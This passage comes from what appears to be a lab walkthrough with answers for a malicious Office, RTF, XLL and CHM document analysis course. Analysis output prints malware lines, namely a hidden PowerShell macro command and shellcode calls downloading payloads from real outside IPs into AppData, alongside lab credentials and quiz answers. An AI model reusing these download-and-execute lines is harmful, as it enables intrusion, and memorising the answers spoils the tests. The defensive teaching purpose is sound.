└──╼ [★]$ xfreerdp /v:10.129.179.206 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[03:02:17:110] [345217:345218] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:02:17:111] [345217:345218] [WARN][com.freerdp.crypto] - CN = Logging-VM
[03:02:17:111] [345217:345218] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:02:17:111] [345217:345218] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:02:17:111] [345217:345218] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:02:17:111] [345217:345218] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.179.206:3389) 
[03:02:17:111] [345217:345218] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:02:17:111] [345217:345218] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:02:17:111] [345217:345218] [ERROR][com.freerdp.crypto] - 	Logging-VM
[03:02:17:111] [345217:345218] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.179.206:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the command prompt and navigate to the `C:\Tools\Maldoc\Office\Tools\oletools\` directory:

Code: cmd

```cmd
cd C:\Tools\Maldoc\Office\Tools\oletools\
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\Tools\Maldoc\Office\Tools\oletools\
```

Subsequently, students will utilize `olevba.py` to analyze the `update-kb.xlsm` file located in the `C:\Tools\Maldoc\Office\Demo\Samples\Excel\Demo\VBA\` directory and find in the macro the PowerShell command used to initiate a process within the `shellCmd` variable:

Code: cmd

```cmd
python .\olevba.py C:\Tools\Maldoc\Office\Demo\Samples\Excel\Demo\VBA\update-kb.xlsm
```

```
C:\Tools\Maldoc\Office\Tools\oletools>python .\olevba.py C:\Tools\Maldoc\Office\Demo\Samples\Excel\Demo\VBA\update-kb.xlsm

XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.12.4 - http://decalage.info/python/oletools
===============================================================================
FILE: C:\Tools\Maldoc\Office\Demo\Samples\Excel\Demo\VBA\update-kb.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
    Call MyMacro
End Sub

<SNIP>

' Run the downloaded executable using PowerShell
        Dim shellCmd As String
        shellCmd = "powershell -ExecutionPolicy Bypass -Command ""{hidden} '" & tempPath & "' -WindowStyle Hidden"""
        Shell "cmd.exe /c " & shellCmd, vbHide
    End If
```

Answer: `Start-Process`

# Analysis of XLL Add-ins

## Question 1

### "Use the debugger, and dump the decrypted shellcode. Perform the analysis on shellcode using speakeasy, and figure out the filename hosted on the remote server. The answer format is 852xxxxxxxxxx.exe"

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-pi1fpr2lzk]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.180 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[05:01:22:681] [7260:7261] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:01:22:681] [7260:7261] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:01:22:681] [7260:7261] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:01:22:736] [7260:7261] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:01:22:736] [7260:7261] [WARN][com.freerdp.crypto] - CN = Logging-VM
[05:01:22:736] [7260:7261] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:01:22:737] [7260:7261] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:01:22:737] [7260:7261] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:01:22:737] [7260:7261] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.232.180:3389) 
[05:01:22:737] [7260:7261] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:01:22:737] [7260:7261] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:01:22:737] [7260:7261] [ERROR][com.freerdp.crypto] - 	Logging-VM
[05:01:22:737] [7260:7261] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.232.180:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will navigate to `C:\Tools\x64dbg\release\x64` and will start `x64dbg.exe`. Subsequently, students will open the preferences `Options > Preferences`:

![[HTB Solutions/Others/z. images/b1ceb5b7c52b21571004ba01facbb8f5_MD5.jpg]]

They will change the breakpoint events to `System Breakpoint`, `Entry Breakpoint`, and `User DLL Entry` and will save the changes:

![[HTB Solutions/Others/z. images/7b47bb31ca5477b8bf1c6bd18a187fe7_MD5.jpg]]

Next, students will attach `rundll32.exe` located in the `C:\Windows\System32` directory from `File > Open`:

![[HTB Solutions/Others/z. images/37406aed2ab795226ceabd8f0f829923_MD5.jpg]]

Students will now change the command to `"C:\Windows\System32\rundll32.exe" C:\Tools\MalDoc\Office\Demo\Samples\Excel\xll\infected.dll, xlAutoOpen` within the `File > Change Command Line`:

![[HTB Solutions/Others/z. images/615dbc6738af78b2771c119b16f75fea_MD5.jpg]]

![[HTB Solutions/Others/z. images/5db1242673f3c53e4aa1ebc30b58edcb_MD5.jpg]]

After the addition, students will restart the program:

![[HTB Solutions/Others/z. images/60b9d0a4b4763d9bce9f036e0b9516a2_MD5.jpg]]

Subsequently, they will run the program until a breakpoint is hit:

![[HTB Solutions/Others/z. images/7cfa400033a752d3b2568c223b34f2fd_MD5.jpg]]

Next, students will navigate to the `Symbols` tab, locate the `infected.dll` module, and add a breakpoint on the `xlAutoOpen` symbol by right-clicking and selecting `Toggle Breakpoint`:

![[HTB Solutions/Others/z. images/7a18926cbca7353331fc3f3cfcbc61a8_MD5.jpg]]

Students will return to the `CPU` tab and will run the program until the breakpoint at `xlAutoOpen` is reached:

![[HTB Solutions/Others/z. images/feca7f945625f1eb786c4df8853d7724_MD5.jpg]]

Subsequently, once the breakpoint is reached, students will step into the `xlAutoOpen` function using `Step into`:

![[HTB Solutions/Others/z. images/1c35665b57787e33c3d58199f2b1c879_MD5.jpg]]

They will notice the amount of junk `jmp` instructions, students will scroll down until they reach the instruction `add r14,E8`, and will add an additional breakpoint:

![[HTB Solutions/Others/z. images/ce564f1dc91badaec4ea0f5e0be2f4cb_MD5.jpg]]

Afterward, students will click on `Run`, and once the breakpoint is reached, they will use the `Step into` function:

![[HTB Solutions/Others/z. images/10c75db1d6fc8e355e1e2a5db59060a8_MD5.jpg]]

Students will right-click on the `R14` address in the `Hide FPU` view and will select `Follow in Dump`:

![[HTB Solutions/Others/z. images/97c7238d6137296221c03e9a73d39e89_MD5.jpg]]

Subsequently, students will use `Step into` to reach the `cmp r14,rax` instruction, and once `kernel32` becomes visible in the ASCII column in the `Dump 1` tab, they will add a breakpoint on the `call infected.6FBE1561` instruction:

![[HTB Solutions/Others/z. images/3d43366026f4fb31ba81f3f4b5418698_MD5.jpg]]

Next, students will click on `Run` and notice a change in the `Dump 1` view where the instructions have been decrypted and the functions are readable. Students will select the bytes starting from `48 81` and to the `DB 1E` and will right-click `Binary > Save To a File` saving the file in the `C:\Temp` directory:

![[HTB Solutions/Others/z. images/a602a8fb5ed347a1265b2e19ec5542df_MD5.jpg]]

![[HTB Solutions/Others/z. images/dd35c32ab2d8c423733d2bf409878454_MD5.jpg]]

Students will open the command prompt and will utilize `speakeasy` to perform analysis of the raw shellcode using the `-r` option and specifying the `x64` as the architecture against the `academy-student.bin` file, finding the name of the executable in the `URLDownloadToFileW` function:

Code: cmd

```cmd
speakeasy -t "C:\temp\academy-student.bin" -r -a x64
```

```
C:\Users\Administrator>speakeasy -t "C:\temp\academy-student.bin" -r -a x64

* exec: shellcode
0x108a: 'kernel32.GetProcAddress(0x77000000, "ExpandEnvironmentStringsW")' -> 0xfeee0000
0x10c8: 'kernel32.ExpandEnvironmentStringsW("%APPDATA%\\joludn.exe", "%APPDATA%\\joludn.exe", 0x104)' -> 0x14
0x10df: 'kernel32.LoadLibraryW("UrlMon")' -> 0x54500000
0x10fd: 'kernel32.GetProcAddress(0x54500000, "URLDownloadToFileW")' -> 0xfeee0001
0x117d: 'urlmon.URLDownloadToFileW(0x0, "http://141.95.107.91/cgi/dl/{hidden}.exe", "%APPDATA%\\joludn.exe", 0x0, 0x0)' -> 0x0
0x1194: 'kernel32.LoadLibraryW("msvcrt")' -> 0x77f10000
0x11a8: 'kernel32.GetProcAddress(0x77f10000, "_wsystem")' -> 0xfeee0002
0xfeee0002: shellcode: Caught error: unsupported_api
Invalid memory read (UC_ERR_READ_UNMAPPED)
Unsupported API: msvcrt._wsystem (ret: 0x11af)
* Finished emulating
```

Answer: `8521000125423.exe`

# Excel-DNA C# XLL Add-ins (Lokibot)

## Question 1

### "Open the XLL sample "C:\\Tools\\MalDoc\\Office\\Demo\\Samples\\xll\\lokibot\\MV SEAMELODY.xll" in the PE-Bear. Go to the Exports tab and figure out the name of the Exported function that ends with Open. Type the function name as your answer. Answer Format is \*\*\*\*\*\*Open"

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-yfdli5tr5z]─[~]
└──╼ [★]$ xfreerdp /v:10.129.242.227 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution 

[07:05:13:426] [82651:82652] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:05:13:426] [82651:82652] [WARN][com.freerdp.crypto] - CN = Logging-VM
[07:05:13:427] [82651:82652] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:05:13:427] [82651:82652] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:05:13:427] [82651:82652] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:05:13:427] [82651:82652] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.242.227:3389) 
[07:05:13:427] [82651:82652] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:05:13:427] [82651:82652] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:05:13:427] [82651:82652] [ERROR][com.freerdp.crypto] - 	Logging-VM
[07:05:13:427] [82651:82652] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.242.227:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will navigate to `C:\Tools\PE-bear` and will open `PE-bear.exe`. Subsequently, students will load the `MV SEAMELODY.xll` file located in the `C:\Tools\MalDoc\Office\Demo\Samples\xll\lokibot\` directory using `File > Load PEs`:

![[HTB Solutions/Others/z. images/7f4801462990050f3ad4fecc4620acb7_MD5.jpg]]

Next, students will navigate to the `Exports` tab and scroll down to the end, where they will find the name ending with `Open` at offset `4ECA0`:

![[HTB Solutions/Others/z. images/f22637ac10abadcfbe97f06a916ac228_MD5.jpg]]

Answer: `xlAutoOpen`

# Analysis of Malicious RTF Files

## Question 1

### "Locate the malicious sample starting with "a60...rtf" in the location "C:\\Tools\\MalDoc\\Office\\Demo\\Samples\\RemcosRAT\\rtf\\". Perform the analysis on this sample and find out which vbs file is being downloaded in AppData. Type the file name as your answer. Answer format is b\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*.vbs"

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-yfdli5tr5z]─[~]
└──╼ [★]$ xfreerdp /v:10.129.169.58 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[07:21:13:198] [107360:107361] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:21:13:198] [107360:107361] [WARN][com.freerdp.crypto] - CN = Logging-VM
[07:21:13:198] [107360:107361] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:21:13:198] [107360:107361] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:21:13:198] [107360:107361] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:21:13:198] [107360:107361] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.169.58:3389) 
[07:21:13:198] [107360:107361] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:21:13:198] [107360:107361] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:21:13:198] [107360:107361] [ERROR][com.freerdp.crypto] - 	Logging-VM
[07:21:13:198] [107360:107361] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.169.58:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the command prompt and use `trid` to verify the rich text format (RTF) of the `a60f72316633a40d5ab45b035ecd03b7cd0162ce161946cfa2ad86d11fbc9c13.rtf` file located in the `C:\Tools\Maldoc\Office\Demo\Samples\RemcosRAT\rtf\`:

Code: cmd

```cmd
trid C:\Tools\Maldoc\Office\Demo\Samples\RemcosRAT\rtf\a60f72316633a40d5ab45b035ecd03b7cd0162ce161946cfa2ad86d11fbc9c13.rtf
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>trid C:\Tools\Maldoc\Office\Demo\Samples\RemcosRAT\rtf\a60f72316633a40d5ab45b035ecd03b7cd0162ce161946cfa2ad86d11fbc9c13.rtf

TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
Definitions found:  18092
Analyzing...

Collecting data from file: C:\Tools\Maldoc\Office\Demo\Samples\RemcosRAT\rtf\a60f72316633a40d5ab45b035ecd03b7cd0162ce161
946cfa2ad86d11fbc9c13.rtf
100.0% (.RTF) Rich Text Format (5000/1)
```

Students will navigate to the `C:\Tools\Maldoc\Office\Tools\DidierStevensSuite` directory and use `rtfdump.py` to analyze the objects present in the RTF file and scrutinize the size of the fourth object in the output:

Code: cmd

```cmd
cd C:\Tools\Maldoc\Office\Tools\DidierStevensSuite
python rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\RemcosRAT\rtf\a60f72316633a40d5ab45b035ecd03b7cd0162ce161946cfa2ad86d11fbc9c13.rtf
```

```
C:\Users\Administrator>cd C:\Tools\Maldoc\Office\Tools\DidierStevensSuite

C:\Tools\Maldoc\Office\Tools\DidierStevensSuite>python rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\RemcosRAT\rtf\a60f72316633a40d5ab45b035ecd03b7cd0162ce161946cfa2ad86d11fbc9c13.rtf

    1 Level  1        c=    2 p=00000000 l=   73177 h=    9638;      26 b=       0   u=    4802 \rtf1
    2  Level  2       c=    0 p=0000000f l=      25 h=       0;       0 b=       0   u=       0 \*\xmltagtype503245349
    3  Level  2       c=    1 p=0000002b l=   73133 h=    9638;      26 b=       0   u=    4802
    4   Level  3      c=    3 p=0000187f l=   66904 h=    8270;      26 b=       0 O u=       1
      Name: b'cDe5ja\x00' Size: 4096 md5: 2ebb4ecf4ae52330deeb0a2218778dad magic: d0cf11e0
    5    Level  4     c=    0 p=000018a4 l=      48 h=       0;      18 b=       0   u=       0 \*\objtime48511143
    6    Level  4     c=    0 p=000018d7 l=      49 h=      12;      18 b=       0   u=       6 \*\f
    7    Level  4     c=    1 p=0000198d l=     275 h=       0;      26 b=       0   u=       0 \object
    8     Level  5    c=    0 p=00001a1d l=     130 h=      52;      24 b=       0   u=      52 \oenniomvihobmkkunbodhnbmz
```

Next, students will use `rtfdump.py` to select the fourth object and use the `--hexdecode` to decode hexadecimal data alongside the `--dump` to save the data (shellcode) into a file:

Code: cmd

```cmd
python rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\RemcosRAT\rtf\a60f72316633a40d5ab45b035ecd03b7cd0162ce161946cfa2ad86d11fbc9c13.rtf --select 4 --hexdecode --dump > C:\Temp\academy-student.sc
```

```
C:\Tools\Maldoc\Office\Tools\DidierStevensSuite>python rtfdump.py C:\Tools\MalDoc\Office\Demo\Samples\RemcosRAT\rtf\a60f72316633a40d5ab45b035ecd03b7cd0162ce161946cfa2ad86d11fbc9c13.rtf --select 4 --hexdecode --dump > C:\Temp\academy-student.sc
```

Students will utilize `XORSearch.exe` to identify the entry address in the shellcode at offset `00000946` (`946`):

Code: cmd

```cmd
XORSearch.exe -W C:\Temp\academy-student.sc
```

```
C:\Tools\Maldoc\Office\Tools\DidierStevensSuite>XORSearch.exe -W C:\Temp\academy-student.sc

Found XOR 00 position 00000946: GetEIP method 3 E9A0010000
Found XOR 00 position 0000001F: OLE file magic number D0CF11E0
Found ROT 25 position 0000001F: OLE file magic number D0CF11E0
Found ROT 24 position 0000001F: OLE file magic number D0CF11E0
Found ROT 23 position 0000001F: OLE file magic number D0CF11E0
Found ROT 22 position 0000001F: OLE file magic number D0CF11E0

<SNIP>
```

Subsequently, students will use the `scdbg.exe` shellcode emulator using the found offset to output the behavior of the shellcode, finding the name of the Visual Basic Script in the `URLDownloadToFileW` function call:

Code: cmd

```cmd
cd C:\Tools\MalDoc\Office\Tools\scdbg\
scdbg.exe /f C:\Temp\academy-student.sc /foff 946
```

```
C:\Tools\Maldoc\Office\Tools\DidierStevensSuite>cd C:\Tools\MalDoc\Office\Tools\scdbg\

C:\Tools\Maldoc\Office\Tools\scdbg>scdbg.exe /f C:\Temp\academy-student.sc /foff 946

Loaded 1027 bytes from file C:\Temp\academy-student.sc
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000
Execution starts at file offset 946
401946  E9A0010000                      jmp 0x401aeb  vv
40194b  A7                              cmpsd
40194c  40                              inc eax
40194d  A022F9D0F0                      mov al,[0xf0d0f922]
401952  95                              xchg eax,ebp

401d21  GetProcAddress(ExpandEnvironmentStringsW)
401d72  ExpandEnvironmentStringsW(%APPDATA%\{hidden}, dst=12fbd8, sz=104)
401d87  LoadLibraryW(UrlMon)
401da2  GetProcAddress(URLDownloadToFileW)
401e14  URLDownloadToFileW(http://147.185.243.107/45700/beautifulglobe.jpg, C:\Users\Administrator\AppData\Roaming\{hidden})
401e2b  LoadLibraryW(shell32)
401e41  GetProcAddress(ShellExecuteW)
401e50  unhooked call to shell32.ShellExecuteW  step=42944

Stepcount 42944
```

Answer: `beautifulldaykiss.vbs`

# Analysis Using CyberChef

## Question 1

### "Perform the analysis of this sample in the local version of CyberChef. Identify any string that ends with .dotm, and use it as your answer."

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-yfdli5tr5z]─[~]
└──╼ [★]$ xfreerdp /v:10.129.94.244 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[07:40:13:071] [136346:136347] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:40:13:071] [136346:136347] [WARN][com.freerdp.crypto] - CN = Logging-VM
[07:40:13:072] [136346:136347] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:40:13:072] [136346:136347] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:40:13:072] [136346:136347] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:40:13:072] [136346:136347] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.94.244:3389) 
[07:40:13:072] [136346:136347] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:40:13:072] [136346:136347] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:40:13:072] [136346:136347] [ERROR][com.freerdp.crypto] - 	Logging-VM
[07:40:13:072] [136346:136347] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.94.244:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will navigate to the `C:\Tools\cyberchef` and open the `CyberChef.html` file using `Firefox`:

![[HTB Solutions/Others/z. images/ecf33672ec9a170b8f2cf58438dc9bd7_MD5.jpg]]

Next, students will load the `cv_itworx.doc` file located in the `C:\Tools\MalDoc\Office\Demo\Samples\cyberchef\apt33\` directory into CyberChef by clicking on the `Open file as input` button:

![[HTB Solutions/Others/z. images/09a9053c3bbc58602cebb790142b8aa9_MD5.jpg]]

Subsequently, students will choose `Strings` from the operations and will use it as a recipe by dragging and dropping:

![[HTB Solutions/Others/z. images/bbdcc04aac6bdf4abe0a57b690718b3e_MD5.jpg]]

Students will click in the `Output`, bring up the find functionality with the key combination CTRL + F, and use the `dotm` string in the search to find the file associated with the file extension:

![[HTB Solutions/Others/z. images/06064652ef1dcde14cb9c216c56cf889_MD5.jpg]]

Answer: `Normal.dotm`

# Malicious CHM Analysis

## Question 1

### "Locate the sample "1.chm" at location "C:\\Tools\\Maldoc\\chm\\Samples\\apt37" and perform analysis on it. Identify the first value of PARAM Item1. Answer contains the name of an executable."

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.61]─[htb-ac-8414@htb-tet54cbxry]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.180 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[00:08:44:216] [86400:86401] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[00:08:44:216] [86400:86401] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[00:08:44:217] [86400:86401] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[00:08:44:264] [86400:86401] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:08:44:264] [86400:86401] [WARN][com.freerdp.crypto] - CN = Logging-VM
[00:08:44:264] [86400:86401] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:08:44:264] [86400:86401] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:08:44:264] [86400:86401] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:08:44:264] [86400:86401] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.232.180:3389) 
[00:08:44:264] [86400:86401] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:08:44:264] [86400:86401] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:08:44:264] [86400:86401] [ERROR][com.freerdp.crypto] - 	Logging-VM
[00:08:44:264] [86400:86401] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.232.180:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the `HTML Help Workshop` located on the Desktop and will select the `File > Decompile` option:

![[HTB Solutions/Others/z. images/4ebcfb065cf929df7f1985bbe4d8362f_MD5.jpg]]

Subsequently, students will choose the `C:\Temp` directory for the `Destination Folder` and `C:\Tools\Maldoc\chm\Samples\apt37\1.chm` for the `Compiled help file` option:

![[HTB Solutions/Others/z. images/7644ece7a03d2a8c8aec8cc391bb6342_MD5.jpg]]

Students will navigate to `C:\Temp` where they will find the extracted files from `1.chm` and are going to open the `Start.html` HTML file with `Firefox` by right-clicking on the file and choosing `Open with > Firefox`:

![[HTB Solutions/Others/z. images/5cac93d8de4c3c2c4f08d28c06f51acc_MD5.jpg]]

Students will use the `View Page Source` functionality within the opened `Firefox` window by right-clicking on the page and selecting `View Page Source` or by using the key combination of `CTRL + U` :

![[HTB Solutions/Others/z. images/048de91be487b6ad44d0c91e023222f3_MD5.jpg]]

Students will find the name of the value in the `PARAM Item1` tag on the seventh line within the new tab in `Firefox` between the commas:

![[HTB Solutions/Others/z. images/0b94c71eaf038e71245c5010dad503dc_MD5.jpg]]

Answer: `mshta.exe`

# Skills Assessment - Maldoc Analysis

## Question 1

### "Analyse the shellcode embedded in Project\_Outline.doc. Provide the IP addresses the shellcode attempts to communicate with."

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.61]─[htb-ac-8414@htb-wytowaeohg]─[~]
└──╼ [★]$ xfreerdp /v:10.129.220.233 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[01:03:59:102] [50599:50600] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[01:03:59:102] [50599:50600] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[01:03:59:103] [50599:50600] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[01:03:59:158] [50599:50600] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
